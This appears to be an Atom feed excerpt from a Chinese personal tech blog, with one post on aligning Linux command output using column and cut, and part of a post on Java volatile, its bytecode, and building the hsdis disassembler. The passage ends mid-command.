    <content type="html"><![CDATA[<h2 id="输出乱了"><a href="#输出乱了" class="headerlink" title="输出乱了?"></a>输出乱了?</h2><p>比如<code>vmstat</code>命令, 输出歪歪扭扭的, 强迫症简直不能忍啊, 而且看个指标还得先对齐下.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  ~  vmstat 1 </span><br><span class="line">procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----</span><br><span class="line"> r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st</span><br><span class="line"> 0  0      0 4577556 281532 3674532    0    0    64    36  192  784  5  1 93  1  0</span><br><span class="line"> 0  0      0 4577992 281532 3674552    0    0     0     0  417 1089  1  1 98  0  0</span><br><span class="line"> 0  0      0 4577960 281540 3674532    0    0     0    44  401 1105  1  0 98  1  0</span><br><span class="line"> 2  0      0 4577960 281540 3674548    0    0     0     0  307  834  1  0 99  0  0</span><br><span class="line"> 0  0      0 4577960 281548 3674548    0    0     0    48  318  773  1  0 99  1  0</span><br></pre></td></tr></table></figure><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="其实-加个column就好了"><a href="#其实-加个column就好了" class="headerlink" title="其实, 加个column就好了"></a>其实, 加个<code>column</code>就好了</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  ~  vmstat 1 5 | column -t</span><br><span class="line">procs  -----------memory----------  ---swap--  -----io----  -system--  ------cpu-----</span><br><span class="line">r      b                            swpd       free         buff       cache           si  so  bi  bo   in   cs    us  sy  id  wa  st</span><br><span class="line">5      0                            0          4565016      281996     3675732         0   0   63  36   192  784   5   1   93  1   0</span><br><span class="line">0      0                            0          4564836      281996     3675756         0   0   0   0    345  805   1   0   99  1   0</span><br><span class="line">0      0                            0          4564744      282004     3675736         0   0   0   88   489  1305  1   0   98  0   0</span><br><span class="line">2      0                            0          4565456      282004     3675736         0   0   0   0    401  1042  1   0   99  0   0</span><br><span class="line">0      0                            0          4566400      282016     3675736         0   0   0   132  823  2357  1   1   98  1   0</span><br></pre></td></tr></table></figure><p>整整齐齐啊, 神清气爽, 不过如果使用<code>vmstat 1 | column -t</code>就会没有任何输出,  <code>vmstat 1</code>相当于每一秒输出一行, <code>column -t</code>会一直傻傻地等着, 所以什么都看不到.</p><p>看下manual:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-t      Determine the number of columns the input contains and create a table.  Columns are delimited with whitespace, by default, or</span><br><span class="line">             with the characters supplied using the -s option.  Useful for pretty-printing displays.</span><br></pre></td></tr></table></figure><p>为了形式上的好看, 还是忍一忍吧.</p><h3 id="行太长了"><a href="#行太长了" class="headerlink" title="行太长了?"></a>行太长了?</h3><p>有的时候会遇到另外一种情况, 就是一行太长了, 这时候满屏都是花的, 比如下面这个:</p><img src="/2018/07/11/column-view/mess.png" title="终端中杂乱的输出"><p>终端中显示的是杂乱的, 但是整个复制出来就神奇的变好了(注意, 不要打开text wrapping)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@l-hpbreezep20.h.cn2 ~]$ cat /proc/softirqs </span><br><span class="line">                    CPU0       CPU1       CPU2       CPU3       CPU4       CPU5       CPU6       CPU7       CPU8       CPU9       CPU10      CPU11      CPU12      CPU13      CPU14      CPU15      CPU16      CPU17      CPU18      CPU19      CPU20      CPU21      CPU22      CPU23      CPU24      CPU25      CPU26      CPU27      CPU28      CPU29      CPU30      CPU31      </span><br><span class="line">          HI:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          6          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          1          0</span><br><span class="line">       TIMER:   43050851   44411905   43919992   42442914   43015809   42846597   42569992   41861589   48809346   43382044   43304198   43899929   46604992   49141675   43598221   44605969   36416696   40245419   43755210   38241174   40310482   36846535   40234221   36373316   37261964   40299828   40815229   48124964   38746814   40687667   39654342   44596933</span><br><span class="line">      NET_TX:     159131      57649        987        947       1124        960        887        897      53415      44445        907        982       5556      31456        921        928        604        665      58417        565       4375        615      16263        532        658        573      15546      23825        560       3679        537      11125</span><br><span class="line">      NET_RX:   54739232  104971608     175092     144098     287613     181637     274003     105699  137866529   37821843     114651       5258   31830654   74227300     149144      41791      32428      12501  136630455      80495   49754625     158541   30734583       3512       2284       2796   35459431  131330367      78501   89945954      50223  117038378</span><br><span class="line">       BLOCK:      81587     139726     179707     144663     159758     190601     132768     276230      72676     287984     130253     323938     152578     206060     141233     141074     193578     251093        448     131136      62687     150827     194672     388017      81603     163935     175096     166935     330730      47293     161579      54246</span><br><span class="line">BLOCK_IOPOLL:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0</span><br><span class="line">     TASKLET:    1675397    3309130       9569       4022       2764       5093       4897      10826    4444030    1454707       1496        286    1048531    2576975        811       2119        442        417    4300523        260    1552321        418    1015839      10748        510        218    1121876    4256900        115    3020283        287    3986726</span><br><span class="line">       SCHED:   15007043   12859515   11501051   11259112   10939612   10774900   10462556   10131094   14234569   10072702    9984370   10190600   11242845   12149746    9940021   10177032    6683735    7652871   10904532    7456442    9226435    7306446    8605291    6707082    6480350    7086698    8286905   11682767    7195542    8529887    7447246   10396247</span><br><span class="line">     HRTIMER:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0</span><br><span class="line">         RCU:   17206657   17427121   18015842   17756453   17731002   17874141   17772044   17467329   18480130   17666877   17975799   18291442   18971854   19696035   18311040   18486331   14653377   16665048   16695739   15810275   15832142   14999192   15912229   14669770   14782425   16825467   16554916   18592285   15670613   15416856   16010390   16910501</span><br></pre></td></tr></table></figure><p>wtf!!!</p><p>这时候就需要结合cut来发挥作用了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@l-hpbreezep20.h.cn2 ~]$ cat /proc/softirqs | column -t  | cut -c -160</span><br><span class="line">CPU0           CPU1      CPU2       CPU3      CPU4      CPU5      CPU6      CPU7      CPU8      CPU9       CPU10     CPU11     CPU12     CPU13     CPU14     CPU</span><br><span class="line">HI:            0         0          0         0         0         0         0         0         0          0         0         0         0         0         6  </span><br><span class="line">TIMER:         42897374  44265424   43773013  42294893  42872190  42703730  42422299  41715918  48651925   43219235  43155865  43751531  46455390  48993651  434</span><br><span class="line">NET_TX:        158851    57164      981       939       1119      956       882       894       53297      43884     904       980       5551      31451     917</span><br><span class="line">NET_RX:        54266774  104535675  175086    144094    287558    181540    273997    105609    137397792  37471099  114548    5252      31830477  74227296  149</span><br><span class="line">BLOCK:         81585     139726     179707    144265    159758    190245    132562    275983    72656      287710    130180    323916    152544    205625    140</span><br><span class="line">BLOCK_IOPOLL:  0         0          0         0         0         0         0         0         0          0         0         0         0         0         0  </span><br><span class="line">TASKLET:       1661705   3295175    9569      4022      2764      5093      4897      10826     4429925    1442145   1496      286       1048531   2576975   811</span><br><span class="line">SCHED:         14954535  12813884   11459036  11217505  10901019  10736479  10424577  10093709  14202602   10037804  9955899   10162495  11215015  12123529  991</span><br><span class="line">HRTIMER:       0         0          0         0         0         0         0         0         0          0         0         0         0         0         0  </span><br><span class="line">RCU:           17145747  17366996   17952484  17693839  17671645  17814624  17709279  17405994  18416537   17600989  17910864  18226002  18906471  19629970  182</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[qisheng.li@l-hpbreezep20.h.cn2 ~]$ cat /proc/softirqs | column -t  | cut -c 150-300</span><br><span class="line">U14     CPU15     CPU16     CPU17     CPU18     CPU19      CPU20     CPU21     CPU22     CPU23     CPU24     CPU25     CPU26     CPU27     CPU28      C</span><br><span class="line">        6         0         0         0         0          0         0         0         0         0         0         0         0         0          0</span><br><span class="line">030995  43485667  44493659  36326549  40157402  43631283   38151873  40219806  36756938  40144515  36283732  37161284  40199408  40717545  48006972   3</span><br><span class="line">451     917       925       601       662       58258      560       4373      614       16262     532       656       572       15544     23806      5</span><br><span class="line">227296  149142    41791     32391     12499     136276000  80492     49754624  158467    30734581  3506      2281      2795      35459426  131010842  7</span><br><span class="line">5644    140738    141074    192744    251010    448        130632    62646     150826    193938    387975    81598     163807    174560    166894     3</span><br><span class="line">        0         0         0         0         0          0         0         0         0         0         0         0         0         0          0</span><br><span class="line">76975   811       2119      442       417       4290461    260       1552321   418       1015839   10748     510       218       1121876   4247160    1</span><br><span class="line">130763  9918727   10155044  6665114   7634478   10872508   7435459   9208357   7287842   8584087   6687254   6464581   7069601   8268941   11657561   7</span><br><span class="line">        0         0         0         0         0          0         0         0         0         0         0         0         0         0          0</span><br><span class="line">645462  18260707  18436150  14614558  16626358  16648198   15772191  15794569  14960694  15874249  14631009  14737925  16781205  16511913  18544088   1</span><br><span class="line"></span><br><span class="line">[qisheng.li@l-hpbreezep20.h.cn2 ~]$ cat /proc/softirqs | column -t  | cut -c 290-</span><br><span class="line">PU28      CPU29     CPU30     CPU31</span><br><span class="line">          0         0         1         0</span><br><span class="line">8025761   38667794  40583340  39575602  44506422</span><br><span class="line">3810      555       3672      535       11121</span><br><span class="line">31059150  78501     89665808  50166     116771524</span><br><span class="line">66900     330730    47290     161396    54232</span><br><span class="line">          0         0         0         0</span><br><span class="line">248714    115       3012042   287       3978676</span><br><span class="line">1661902   7180114   8511025   7432308   10374288</span><br><span class="line">          0         0         0         0</span><br><span class="line">8550398   15634808  15373695  15974460  16871666</span><br></pre></td></tr></table></figure><p>整整齐齐才好看啊!<br>唉, <code>cpu</code>太多也是麻烦啊</p><h2 id="其他思路"><a href="#其他思路" class="headerlink" title="其他思路"></a>其他思路</h2><p>今天在<code>性能之巅</code>发现, <code>vmstat</code>支持列模式, <code>-s</code>可以按照列输出, <code>-Sm</code>修改输出的单位为<code>m</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">➜  ~  vmstat -asSm 1 </span><br><span class="line">        12500 m total memory</span><br><span class="line">         4053 m used memory</span><br><span class="line">         5919 m active memory</span><br><span class="line">         1883 m inactive memory</span><br><span class="line">         3940 m free memory</span><br><span class="line">          760 m buffer memory</span><br><span class="line">         3745 m swap cache</span><br><span class="line">         4294 m total swap</span><br><span class="line">            0 m used swap</span><br><span class="line">         4294 m free swap</span><br><span class="line">       606762 non-nice user cpu ticks</span><br><span class="line">         3887 nice user cpu ticks</span><br><span class="line">       140316 system cpu ticks</span><br><span class="line">      8108433 idle cpu ticks</span><br><span class="line">        91538 IO-wait cpu ticks</span><br><span class="line">            0 IRQ cpu ticks</span><br><span class="line">         3461 softirq cpu ticks</span><br><span class="line">            0 stolen cpu ticks</span><br><span class="line">      2775187 pages paged in</span><br><span class="line">      3731660 pages paged out</span><br><span class="line">            0 pages swapped in</span><br><span class="line">            0 pages swapped out</span><br><span class="line">     16443967 interrupts</span><br><span class="line">     81534611 CPU context switches</span><br><span class="line">   1532129612 boot time</span><br><span class="line">        39867 forks</span><br></pre></td></tr></table></figure><p>mysql也有对应的列模式:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select *  from hotel_order_simple limit 1;</span><br><span class="line">+------+-----------------+--------------+-------------+---------------+------------+---------------------+------------+-------------+----------+-----------+-------------+---------------------+</span><br><span class="line">| id   | uid             | order_no     | user_name   | contact_phone | card_index | create_date         | order_type | user_status | terminal | room_type | region_type | update_time         |</span><br><span class="line">+------+-----------------+--------------+-------------+---------------+------------+---------------------+------------+-------------+----------+-----------+-------------+---------------------+</span><br><span class="line">| 1109 | 66666666666666 | 66666666666666 | 66666666666666 | 66666666666666   |            | 2018-06-03 11:12:14 | 1005001    |      100070 | app      |         0 |           1 | 2018-06-04 20:09:56 |</span><br><span class="line">+------+-----------------+--------------+-------------+---------------+------------+---------------------+------------+-------------+----------+-----------+-------------+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">// 列模式</span><br><span class="line"></span><br><span class="line">mysql&gt; select *  from hotel_order_simple limit 1 \G;</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">           id: 1109</span><br><span class="line">          uid: 66666666666666</span><br><span class="line">     order_no: 66666666666666</span><br><span class="line">    user_name: 66666666666666</span><br><span class="line">contact_phone: 66666666666666</span><br><span class="line">   card_index: </span><br><span class="line">  create_date: 2018-06-03 11:12:14</span><br><span class="line">   order_type: 1005001</span><br><span class="line">  user_status: 100070</span><br><span class="line">     terminal: app</span><br><span class="line">    room_type: 0</span><br><span class="line">  region_type: 1</span><br><span class="line">  update_time: 2018-06-04 20:09:56</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">ERROR: </span><br><span class="line">No query specified</span><br></pre></td></tr></table></figure><p>所以, 有的时候多看看手册也不错.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;输出乱了&quot;&gt;&lt;a href=&quot;#输出乱了&quot; class=&quot;headerlink&quot; title=&quot;输出乱了?&quot;&gt;&lt;/a&gt;输出乱了?&lt;/h2&gt;&lt;p&gt;比如&lt;code&gt;vmstat&lt;/code&gt;命令, 输出歪歪扭扭的, 强迫症简直不能忍啊, 而且看个指标还得先对齐下.&lt;/
      
    
    </summary>
    
      <category term="linux" scheme="http://qsli.github.io/categories/linux/"/>
    
    
      <category term="format" scheme="http://qsli.github.io/tags/format/"/>
    
  </entry>
  
  <entry>
    <title>volatile</title>
    <link href="http://qsli.github.io/2018/07/08/volatile/"/>
    <id>http://qsli.github.io/2018/07/08/volatile/</id>
    <published>2018-07-08T14:59:50.000Z</published>
    <updated>2018-08-11T12:42:43.011Z</updated>
    
    <content type="html"><![CDATA[<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>volatile的作用:</p><p>1.保证多个线程”同时”修改”共享”变量时不会因为cpu cache等原因而造成不一致,  </p><p>2.另外的作用就是防止指令重排</p><h2 id="防止指令重排"><a href="#防止指令重排" class="headerlink" title="防止指令重排"></a>防止指令重排</h2><p><code>Double-Checked Locking</code>中实例必须可以通过加上<code>volatile</code>关键字来防止防止指令重排产生的影响.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Works with acquire/release semantics for volatile</span></span><br><span class="line"><span class="comment">// Broken under current semantics for volatile</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">Foo</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 注意必须是volatile</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">volatile</span> Helper helper = <span class="keyword">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> Helper <span class="title">getHelper</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (helper == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">synchronized</span>(<span class="keyword">this</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (helper == <span class="keyword">null</span>)</span><br><span class="line">                        helper = <span class="keyword">new</span> Helper();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> helper;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><h3 id="字节码"><a href="#字节码" class="headerlink" title="字节码"></a>字节码</h3><p>查看编译后的字节码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">➜  jvm  javap -v -p  Foo</span><br><span class="line">Classfile /home/qishengli/test/jvm/Foo.class</span><br><span class="line">  Last modified Jul 8, 2018; size 521 bytes</span><br><span class="line">  MD5 checksum 1bacc25f9d4c0bf1b0b5c0f46172767f</span><br><span class="line">  Compiled from &quot;Foo.java&quot;</span><br><span class="line">class Foo</span><br><span class="line">  minor version: 0</span><br><span class="line">  major version: 52</span><br><span class="line">  flags: ACC_SUPER</span><br><span class="line">Constant pool:</span><br><span class="line">   #1 = Methodref          #6.#22         // java/lang/Object.&quot;&lt;init&gt;&quot;:()V</span><br><span class="line">   #2 = Fieldref           #5.#23         // Foo.helper:LFoo$Helper;</span><br><span class="line">   #3 = Class              #24            // Foo$Helper</span><br><span class="line">   #4 = Methodref          #3.#25         // Foo$Helper.&quot;&lt;init&gt;&quot;:(LFoo;)V</span><br><span class="line">   #5 = Class              #26            // Foo</span><br><span class="line">   #6 = Class              #27            // java/lang/Object</span><br><span class="line">   #7 = Utf8               Helper</span><br><span class="line">   #8 = Utf8               InnerClasses</span><br><span class="line">   #9 = Utf8               helper</span><br><span class="line">  #10 = Utf8               LFoo$Helper;</span><br><span class="line">  #11 = Utf8               &lt;init&gt;</span><br><span class="line">  #12 = Utf8               ()V</span><br><span class="line">  #13 = Utf8               Code</span><br><span class="line">  #14 = Utf8               LineNumberTable</span><br><span class="line">  #15 = Utf8               getHelper</span><br><span class="line">  #16 = Utf8               ()LFoo$Helper;</span><br><span class="line">  #17 = Utf8               StackMapTable</span><br><span class="line">  #18 = Class              #27            // java/lang/Object</span><br><span class="line">  #19 = Class              #28            // java/lang/Throwable</span><br><span class="line">  #20 = Utf8               SourceFile</span><br><span class="line">  #21 = Utf8               Foo.java</span><br><span class="line">  #22 = NameAndType        #11:#12        // &quot;&lt;init&gt;&quot;:()V</span><br><span class="line">  #23 = NameAndType        #9:#10         // helper:LFoo$Helper;</span><br><span class="line">  #24 = Utf8               Foo$Helper</span><br><span class="line">  #25 = NameAndType        #11:#29        // &quot;&lt;init&gt;&quot;:(LFoo;)V</span><br><span class="line">  #26 = Utf8               Foo</span><br><span class="line">  #27 = Utf8               java/lang/Object</span><br><span class="line">  #28 = Utf8               java/lang/Throwable</span><br><span class="line">  #29 = Utf8               (LFoo;)V</span><br><span class="line">&#123;</span><br><span class="line">  private volatile Foo$Helper helper;</span><br><span class="line">    descriptor: LFoo$Helper;</span><br><span class="line">    flags: ACC_PRIVATE, ACC_VOLATILE</span><br><span class="line"></span><br><span class="line">  Foo();</span><br><span class="line">    descriptor: ()V</span><br><span class="line">    flags:</span><br><span class="line">    Code:</span><br><span class="line">      stack=2, locals=1, args_size=1</span><br><span class="line">         0: aload_0</span><br><span class="line">         1: invokespecial #1                  // Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V</span><br><span class="line">         4: aload_0</span><br><span class="line">         5: aconst_null</span><br><span class="line">         6: putfield      #2                  // Field helper:LFoo$Helper;</span><br><span class="line">         9: return</span><br><span class="line">      LineNumberTable:</span><br><span class="line">        line 1: 0</span><br><span class="line">        line 2: 4</span><br><span class="line"></span><br><span class="line">  public Foo$Helper getHelper();</span><br><span class="line">    descriptor: ()LFoo$Helper;</span><br><span class="line">    flags: ACC_PUBLIC</span><br><span class="line">    Code:</span><br><span class="line">      stack=4, locals=3, args_size=1</span><br><span class="line">         0: aload_0</span><br><span class="line">         1: getfield      #2                  // Field helper:LFoo$Helper;</span><br><span class="line">         4: ifnonnull     40</span><br><span class="line">         7: aload_0</span><br><span class="line">         8: dup</span><br><span class="line">         9: astore_1</span><br><span class="line">        10: monitorenter</span><br><span class="line">        11: aload_0</span><br><span class="line">        12: getfield      #2                  // Field helper:LFoo$Helper;</span><br><span class="line">        15: ifnonnull     30</span><br><span class="line">        18: aload_0</span><br><span class="line">        19: new           #3                  // class Foo$Helper</span><br><span class="line">        22: dup</span><br><span class="line">        23: aload_0</span><br><span class="line">        24: invokespecial #4                  // Method Foo$Helper.&quot;&lt;init&gt;&quot;:(LFoo;)V</span><br><span class="line">        27: putfield      #2                  // Field helper:LFoo$Helper;</span><br><span class="line">        30: aload_1</span><br><span class="line">        31: monitorexit</span><br><span class="line">        32: goto          40</span><br><span class="line">        35: astore_2</span><br><span class="line">        36: aload_1</span><br><span class="line">        37: monitorexit</span><br><span class="line">        38: aload_2</span><br><span class="line">        39: athrow</span><br><span class="line">        40: aload_0</span><br><span class="line">        41: getfield      #2                  // Field helper:LFoo$Helper;</span><br><span class="line">        44: areturn</span><br><span class="line">      Exception table:</span><br><span class="line">         from    to  target type</span><br><span class="line">            11    32    35   any</span><br><span class="line">            35    38    35   any</span><br><span class="line">      LineNumberTable:</span><br><span class="line">        line 4: 0</span><br><span class="line">        line 5: 7</span><br><span class="line">        line 6: 11</span><br><span class="line">        line 7: 18</span><br><span class="line">        line 9: 30</span><br><span class="line">        line 11: 40</span><br><span class="line">      StackMapTable: number_of_entries = 3</span><br><span class="line">        frame_type = 252 /* append */</span><br><span class="line">          offset_delta = 30</span><br><span class="line">          locals = [ class java/lang/Object ]</span><br><span class="line">        frame_type = 68 /* same_locals_1_stack_item */</span><br><span class="line">          stack = [ class java/lang/Throwable ]</span><br><span class="line">        frame_type = 250 /* chop */</span><br><span class="line">          offset_delta = 4</span><br><span class="line">&#125;</span><br><span class="line">SourceFile: &quot;Foo.java&quot;</span><br><span class="line">InnerClasses:</span><br><span class="line">     #7= #3 of #5; //Helper=class Foo$Helper of class Foo</span><br></pre></td></tr></table></figure><p>去掉<code>volatile</code>关键字, 后对比生成的字节码:</p><img src="/2018/07/08/volatile/diff.png" title="两次生成字节码的diff"><p>可见只是多了一个访问的表示<code>ACC_VOLATILE</code></p><p>从<code>The Java® Virtual Machine Specification</code>中可以找到如下的说明:</p><blockquote><p>ACC_VOLATILE 0x0040 Declared volatile; cannot be cached;</p></blockquote><p>既然字节码层面找不到太多的蛛丝马迹, 我们来看看汇编的代码</p><h3 id="汇编代码"><a href="#汇编代码" class="headerlink" title="汇编代码"></a>汇编代码</h3><p>要查看汇编代码需要用到一个叫做<code>hsdis</code>(A HotSpot plugin for disassembling dynamically generated code.)的工具, 这个工具可以自己下载<code>openjdk</code>的代码编译, 也可以下载别人已经编译好的.</p><p><code>openjdk</code>中对应的源码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  jvm  locate hsdis         </span><br><span class="line">/home/qishengli/openjdk-8-src-b132-03_mar_2014-master/openjdk/hotspot/src/share/tools/hsdis</span><br><span class="line">/home/qishengli/openjdk-8-src-b132-03_mar_2014-master/openjdk/hotspot/src/share/tools/hsdis/Makefile</span><br><span class="line">/home/qishengli/openjdk-8-src-b132-03_mar_2014-master/openjdk/hotspot/src/share/tools/hsdis/README</span><br><span class="line">/home/qishengli/openjdk-8-src-b132-03_mar_2014-master/openjdk/hotspot/src/share/tools/hsdis/hsdis-demo.c</span><br><span class="line">/home/qishengli/openjdk-8-src-b132-03_mar_2014-master/openjdk/hotspot/src/share/tools/hsdis/hsdis.c</span><br><span class="line">/home/qishengli/openjdk-8-src-b132-03_mar_2014-master/openjdk/hotspot/src/share/tools/hsdis/hsdis.h</span><br></pre></td></tr></table></figure><p>编译时需要下载<code>binutils-2.19.1</code>, 编译命令如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  hsdis  ls</span><br><span class="line">binutils-2.19.1  binutils-2.19.1.tar.bz2  build  hsdis.c  hsdis-demo.c  hsdis.h  Makefile  README</span><br><span class="line">➜  hsdis  sudo make BINUTILS=binutils-2.19.1 ARCH=amd64</span><br></pre></td></tr></table></figure><p>不过<code>binutils</code>的编译配置中, 如果用的是gcc编译会把所有的warning当作error, 可以看到config.log的输出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cc1: all warnings being treated as errors</span><br></pre></td></tr></table></figure></p><p>强行替换<code>-Werror</code>为’’:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -type f -name &quot;包含-Werror的文件&quot; | xargs -I&#123;&#125; sudo sed -i &quot;s#-Werror##g&quot; 